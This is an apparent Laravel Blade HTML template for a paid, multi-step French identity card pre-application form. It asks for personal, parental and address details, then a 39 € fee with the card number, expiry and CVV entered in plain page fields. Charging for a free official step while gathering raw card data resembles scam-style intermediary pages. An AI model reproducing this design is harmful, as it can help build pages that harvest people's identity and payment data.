<!doctype html>
<html lang="en-US">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Custom Css -->
    <link rel="stylesheet" href="forms.css" type="text/css" />
    
    <link rel="icon" href="images/favicon.png" type="image/x-icon">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" integrity="sha384-WskhaSGFgHYWDcbwN70/dfYBj47jz9qbsMId/iRN3ewGhXQFZCSftd1LZCfmhktB" crossorigin="anonymous">

    <!-- Custom Css -->
    <link rel="stylesheet" href="style.css" type="text/css" />

    <!-- Ionic icons -->
    <link href="https://unpkg.com/ionicons@4.2.0/dist/css/ionicons.min.css" rel="stylesheet">

    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900" rel="stylesheet">

    <title>CINFr Carte d'identité Nationale</title>
  </head>

  <body>

    <!-- boîte d’alerte personnalisée -->
    <div id="custom-alert" class="custom-alert">
      <span id="custom-alert-msg"></span>
      <button id="custom-alert-close">&times;</button>
    </div>


      <!-- N A V B A R -->
@include('layouts.navbar')



<section id="banner">
  <div class="container text-center">
    <div>
      :
    </div>
    <h1 class="mt-3">Pré-demande en ligne de CNI (carte nationale d'identité française)</h1>
  </div>
</section>
<!-- E N D  N A V B A R -->













<section id="form-background">
  <div id="form-section">
    <!-- Barre de progression -->
    <div class="progress-bar">
      <div class="progress-bar-inner" id="progress-bar"></div>
    </div>

    <!------------------------------------------------- Étape 1 ------------------------------------------------------------------------------>
    <div class="form-part" id="step-1">
      <div class="form-group">
        <h4>La demande concerne un : <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <div class="radio-options">
          <div>
            <input type="radio" id="majeur" name="type_demande" value="majeur" required>
            <label for="majeur">Majeur</label>
          </div>
          <div>
            <input type="radio" id="mineur" name="type_demande" value="mineur" required>
            <label for="mineur">Mineur</label>
          </div>
        </div>
      </div>

      <div class="form-group">
        <h4>Raison de la demande <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <select name="raison_demande" style="width: 100%;" required>
          <option value="">Sélectionnez une raison</option>
          <option value="premiere">Première demande</option>
          <option value="renouvellement">Renouvellement</option>
        </select>
      </div>

      <div class="form-group">
        <h4>Dans quel département effectuez-vous votre demande ? <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <select name="departement_demande" style="width: 100%;" required>
          <option value="">Sélectionnez un département</option>
          <option value="01">01 Ain</option>
          <option value="02">02 Aisne</option>
        </select>
      </div>
    </div>

    <!------------------------------------------------- Étape 2 ------------------------------------------------------------------------------>
    <div class="form-part" id="step-2" style="display: none;">
      <div class="form-group">
        <h4>Sexe : <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <div class="radio-options">
          <div>
            <input type="radio" id="homme" name="sexe" value="homme" required>
            <label for="homme">Homme</label>
          </div>
          <div>
            <input type="radio" id="femme" name="sexe" value="femme" required>
            <label for="femme">Femme</label>
          </div>
        </div>
      </div>

      <div class="form-group">
        <h4>Nom de naissance <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <input type="text" name="nom_naissance" placeholder="Nom de naissance" required>
      </div>

      <div class="form-group">
        <h4>Deuxième nom</h4>
        <input type="text" name="deuxieme_nom" placeholder="Deuxième nom">
      </div>

      <div class="form-group">
        <h4>Prénoms <span style="color: red;">(Au moins 1)</span></h4>
        <input type="text" name="prenom1" placeholder="1er prénom" required>
        <input type="text" name="prenom2" placeholder="2ème prénom">
        <input type="text" name="prenom3" placeholder="3ème prénom">
      </div>

      <div class="form-group">
        <h4>Taille <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <select name="taille" required>
          <option value="">Sélectionnez votre taille</option>
          <option value="1.00">1.00 m</option>
          <!-- ... -->
          <option value="3.00">3.00 m</option>
        </select>
      </div>

      <div class="form-group">
        <h4>Couleur des yeux <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <select name="couleur_yeux" required>
          <option value="">Sélectionnez la couleur</option>
          <option value="noir">Noir</option>
          <option value="marron">Marron</option>
          <option value="bleu">Bleu</option>
          <option value="vert">Vert</option>
          <option value="gris">Gris</option>
        </select>
      </div>

      <div class="form-group">
        <h4>Date de naissance <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <input type="date" name="date_naissance" required>
      </div>

      <div class="form-group">
        <h4>Pays de naissance <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <select name="pays_naissance" required>
          <option value="">Sélectionnez le pays</option>
          <option value="france">France</option>
          <option value="autre">Autre</option>
        </select>
      </div>

      <div class="form-group">
        <h4>Département ou COM de naissance <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <select name="dept_naissance" required>
          <option value="">Sélectionnez le département</option>
          <option value="01">01 Ain</option>
          <option value="971">971 Guadeloupe</option>
        </select>
      </div>

      <div class="form-group">
        <h4>Commune de naissance <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
        <input type="text" name="commune_naissance" required>
      </div>
    </div>

<!------------------------------------------------- Étape 3 ------------------------------------------------------------------------------>

<div class="form-part" id="step-3" style="display: none;">
  <h1>Père</h1>
  <div class="form-group">
    <h4>Père inconnu <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
    <div class="radio-options">
      <div>
        <input type="radio" id="pere-inconnu-oui" name="pere_inconnu" value="oui" required>
        <label for="pere-inconnu-oui">Oui</label>
      </div>
      <div>
        <input type="radio" id="pere-inconnu-non" name="pere_inconnu" value="non" required>
        <label for="pere-inconnu-non">Non</label>
      </div>
    </div>
  </div>

  <div id="pere-details" style="display: none;">
    <div class="form-group">
      <h4>Nom de naissance du père <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
      <input type="text" id="pere_nom" name="pere_nom" placeholder="Nom de naissance du père" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
    </div>

    <div class="form-group">
      <h4>Prénoms du père</h4>
      <input type="text" id="pere_prenom1" name="pere_prenom1" placeholder="1er prénom du père" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
      <input type="text" id="pere_prenom2" name="pere_prenom2" placeholder="2ème prénom du père" style="width:100%;margin-top:8px;padding:8px;border:1px solid #ddd;border-radius:4px;">
    </div>

    <div class="form-group">
      <h4>Date de naissance du père</h4>
      <input type="date" id="pere_naissance_date" name="pere_naissance_date" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;">
    </div>

    <div class="form-group">
      <h4>Ville de naissance du père</h4>
      <input type="text" id="pere_naissance_ville" name="pere_naissance_ville" placeholder="Ville de naissance du père" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;">
    </div>

    <div class="form-group">
      <h4>Nationalité du père</h4>
      <input type="text" id="pere_nationalite" name="pere_nationalite" placeholder="Nationalité du père" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;">
    </div>
  </div>

  <h1>Mère</h1>
  <div class="form-group">
    <h4>Mère inconnue <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
    <div class="radio-options">
      <div>
        <input type="radio" id="mere-inconnue-oui" name="mere_inconnue" value="oui" required>
        <label for="mere-inconnue-oui">Oui</label>
      </div>
      <div>
        <input type="radio" id="mere-inconnue-non" name="mere_inconnue" value="non" required>
        <label for="mere-inconnue-non">Non</label>
      </div>
    </div>
  </div>

  <div id="mere-details" style="display: none;">
    <div class="form-group">
      <h4>Nom de naissance de la mère <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
      <input type="text" id="mere_nom" name="mere_nom" placeholder="Nom de naissance de la mère" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
    </div>

    <div class="form-group">
      <h4>Prénoms de la mère</h4>
      <input type="text" id="mere_prenom1" name="mere_prenom1" placeholder="1er prénom de la mère" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
      <input type="text" id="mere_prenom2" name="mere_prenom2" placeholder="2ème prénom de la mère" style="width:100%;margin-top:8px;padding:8px;border:1px solid #ddd;border-radius:4px;">
    </div>

    <div class="form-group">
      <h4>Date de naissance de la mère</h4>
      <input type="date" id="mere_naissance_date" name="mere_naissance_date" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;">
    </div>

    <div class="form-group">
      <h4>Ville de naissance de la mère</h4>
      <input type="text" id="mere_naissance_ville" name="mere_naissance_ville" placeholder="Ville de naissance de la mère" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;">
    </div>

    <div class="form-group">
      <h4>Nationalité de la mère</h4>
      <input type="text" id="mere_nationalite" name="mere_nationalite" placeholder="Nationalité de la mère" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;">
    </div>
  </div>
</div>

<!------------------------------------------------- Étape 4 ------------------------------------------------------------------------------>

<div class="form-part" id="step-4" style="display: none;">
  <h4>Vous êtes Français(e) car : <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
  <div class="checkbox-options">
    <div>
      <input type="checkbox" id="nat_naissance_parent_france" name="nat_naissance_parent_france" value="naissance-parent-france">
      <label for="nat_naissance_parent_france">Vous êtes né(e) en France et l'un de vos parents est né en France</label>
    </div>
    <div>
      <input type="checkbox" id="nat_naissance_parent_ancien" name="nat_naissance_parent_ancien" value="naissance-parent-ancien">
      <label for="nat_naissance_parent_ancien">Vous êtes né(e) en France et l'un de vos parents est né dans un ancien territoire français</label>
    </div>
    <div>
      <input type="checkbox" id="nat_naissance_parent_francais" name="nat_naissance_parent_francais" value="naissance-parent-francais">
      <label for="nat_naissance_parent_francais">Vous êtes né(e) en France et l'un de vos parents est français</label>
    </div>
    <div>
      <input type="checkbox" id="nat_etranger_parent_francais" name="nat_etranger_parent_francais" value="etranger-parent-francais">
      <label for="nat_etranger_parent_francais">Vous n'êtes pas né(e) en France et l'un de vos parents est français</label>
    </div>
    <div>
      <input type="checkbox" id="nat_parent_devenu_francais" name="nat_parent_devenu_francais" value="parent-devient-francais">
      <label for="nat_parent_devenu_francais">Votre parent est devenu français avant votre majorité</label>
    </div>
    <div>
      <input type="checkbox" id="nat_mariage" name="nat_mariage" value="nationalite-par-mariage">
      <label for="nat_mariage">Vous êtes français(e) par mariage</label>
    </div>
    <div>
      <input type="checkbox" id="nat_reintegre" name="nat_reintegre" value="reintegre-francais">
      <label for="nat_reintegre">Vous avez été réintégré(e) dans la nationalité française</label>
    </div>
    <div>
      <input type="checkbox" id="nat_declaration" name="nat_declaration" value="declaration-non-mariage">
      <label for="nat_declaration">Vous êtes français(e) par déclaration</label>
    </div>
    <div style="display: flex; align-items: center; gap: 10px;">
      <input type="checkbox" id="nat_autre" name="nat_autre" value="autre-motif">
      <label for="nat_autre">Autre motif</label>
      <input type="text" id="nat_autre_texte" name="nat_autre_texte" placeholder="Précisez" style="flex: 1;">
    </div>

  </div>
</div>



<!------------------------------------------------- Étape 5 ------------------------------------------------------------------------------>

<div class="form-part" id="step-5" style="display: none;">
  <h4>Adresse du demandeur concerné par le titre : <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
  
  <label for="adresse_demandeur">Adresse du demandeur concerné par le titre</label>
  <input type="text" id="adresse_demandeur" name="adresse_demandeur" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
  
  <label for="adresse_ville">Ville</label>
  <input type="text" id="adresse_ville" name="adresse_ville" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
  
  <label for="adresse_zip">ZIP / Code postal</label>
  <input type="text" id="adresse_zip" name="adresse_zip" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
  
  <label for="adresse_complement">Complément d'adresse (étage, escalier, appartement…)</label>
  <input type="text" id="adresse_complement" name="adresse_complement" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;">

  <h4>Informations de contact : <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
  
  <label for="telephone">Téléphone portable (Format : 0601020304)</label>
  <input type="tel" id="telephone" name="telephone" pattern="^0[1-9][0-9]{8}$" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
  
  <label for="email">E-mail</label>
  <input type="email" id="email" name="email" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>

  <h4>Validation : <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
  <div class="checkbox-options">
    <div>
      <input type="radio" id="validation_info" name="validation_info" value="info_correctes" required>
      <label for="validation_info">Je confirme que les informations transmises sont correctes</label>
    </div>
    <div>
      <input type="radio" id="validation_politique" name="validation_politique" value="politique_confidentialite" required>
      <label for="validation_politique">Je valide la politique de confidentialité du site</label>
    </div>
    <div>
      <input type="radio" id="validation_conditions" name="validation_conditions" value="conditions_generales" required>
      <label for="validation_conditions">Je valide les conditions générales de vente du site</label>
    </div>
  </div>


</div>

<!------------------------------------------------- Étape 6 ------------------------------------------------------------------------------>

<div class="form-part" id="step-6" style="display: none;">
  <h4>Frais de traitement de la pré-demande de CNI</h4>
  <p>Prix : <strong>39,00 €</strong></p>

  <h4>Paiement par Carte Bancaire : <span class="required-tooltip" title="Champ nécessaire">*</span></h4>
  
  <label for="carte_bancaire">Numéro de carte</label>
  <input type="text" id="carte_bancaire" name="carte_bancaire" placeholder="0000 0000 0000 0000" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
  
  <label for="expiration_date">Date d’expiration</label>
  <input type="month" id="expiration_date" name="expiration_date" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>
  
  <label for="cvv">CVV</label>
  <input type="text" id="cvv" name="cvv" placeholder="123" pattern="^[0-9]{3}$" style="width:100%;padding:8px;border:1px solid #ddd;border-radius:4px;" required>

  <h4>Connexion Link et formulaire d’entrée de carte bancaire :</h4>
  <p>Veuillez entrer les informations de votre carte pour compléter votre paiement.</p>

  <div class="buttons" style="display:flex;justify-content:flex-end;margin-top:30px;">
    <a href="https://buy.stripe.com/test_14kaID7MvbSJ5u8144" id="pay_btn" class="btn btn-primary" style="display:none;">Payer</a>
  </div>
</div>




<!------------------------------------------------- Boutons ------------------------------------------------------------------------------>



  <div class="buttons">
    <button class="btn btn-secondary" id="prev-btn" onclick="prevStep()" style="display:none;">Précédent</button>
    <button class="btn btn-primary" id="next-btn" onclick="nextStep()">Suivant</button>
  </div>
</section>






















<!-- T E S T I M O N I A L S -------- 1 ----------->
<section id="crestimonials">
  <div class="container">
    <div class="title-block text-center">
      <h2 style="white-space: nowrap;">Étapes pour la demande de Carte Nationale d'Identité </h2>

      <p>En France, la carte d'identité est un document officiel qui atteste de l'identité d'une personne. Elle permet également aux citoyens français de voyager sans passeport au sein de l'Union européenne et de l'espace Schengen, avec une durée de validité de 15 ans pour les adultes et de 10 ans pour les mineurs.</p>
    </div>
    <div class="row align-items-center mt-5">
      <div class="col-md-6">
        <img src="images/Forms-amico.png" alt="Simplified Process" class="img-fluid">
      </div>
      <div class="col-md-6">
        <div class="benefits-box">
          <h3 class="text-primary">Pré - demandes</h3>
          <p>Nous réalisons pour vous la pré-demande de votre carte nationale d'identité française via le service en ligne officiel de l'ANTS (Agence Nationale des Titres Sécurisés).</p>
      </div>
      </div>
    </div>
  </div>


  <!-- E N D  T E S T I M O N I A L S     1   -->
<!-- T E S T I M O N I A L S -------- 2 ----------->
  <div class="container">
    <div class="row align-items-center mt-5">
      <div class="col-md-6 order-md-2">
        <img src="images/Reminders-pana.png" alt="Simplified Process" class="img-fluid">
      </div>
      <div class="col-md-6 order-md-1">
        <div class="benefits-box">
          <h3 class="text-primary">Réception et Prise de Rendez-vous</h3>
          <p>Vous recevrez sous 48 heures un récapitulatif complet de votre pré-demande. Munissez-vous de ce document pour prendre rendez-vous auprès de la mairie de votre choix afin de finaliser la procédure.</p>
        </div>
      </div>
    </div>
  </div>



  <!-- E N D  T E S T I M O N I A L S     2   -->
  <!-- T E S T I M O N I A L S -------- 3 ----------->
    <div class="container">
        <div class="row align-items-center mt-5">
          <div class="col-md-6">
            <img src="images/Done-pana.png" alt="Simplified Process" class="img-fluid">
          </div>
          <div class="col-md-6">
            <div class="benefits-box">
              <h3 class="text-primary">Retrait de votre Carte d'Identité</h3>
              <p>Une fois prête, votre carte nationale d'identité sera disponible au retrait dans un délai dépendant des services de la mairie. La remise s'effectue exclusivement en personne, sur présentation de vos justificatifs.</p>
          </div>
          </div>
        </div>
        
</section>
<!-- E N D  T E S T I M O N I A L S     3   -->    
        <button id="scrollTopBtn">
          ↑
        </button>


  <!--  F O O T E R  -->
  @include('layouts.footer')

  <!--  E N D  F O O T E R  -->
    

    <!-- External JavaScripts -->
    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js" integrity="sha384-smHYKdLADwkXOn1EmN1qk/HfnUcbVRZyYmZ4qpPea6sjB/pTJ0euyQp0Mk8ck+5T" crossorigin="anonymous"></script>
  
    <!-- JavaScripts Link -->  
    <script src="{{ asset('js/forms.js') }}"></script>


    <script type="text/javascript">
        // pour tous les inputs et selects, on bascule la classe "filled"
        function markFilled(el) {
          if (el.value && el.value.trim() !== '') el.classList.add('filled');
          else el.classList.remove('filled');
        }

        // au chargement initial
        document.querySelectorAll('input, select').forEach(el => {
          markFilled(el);
          el.addEventListener('input', () => markFilled(el));
          el.addEventListener('change', () => markFilled(el));
        });

    </script>



  </body>
</html>